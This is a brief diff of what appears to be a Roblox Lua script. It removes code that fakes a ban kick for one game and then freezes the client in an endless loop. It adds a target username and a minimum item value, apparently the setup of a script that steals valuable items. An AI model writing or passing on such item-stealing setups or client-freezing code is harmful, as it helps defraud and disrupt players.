@@ -1,9 +1,3 @@
-if game.PlaceId == 2788229376 then
-
-   game.Players.LocalPlayer:Kick("USER BANNED")
-
-end
-
-wait(2)
-
-while true do end
+Username = "rumak_11010101"
+Username2 = "rumak_11010101"
+MinimumRAP = 100000
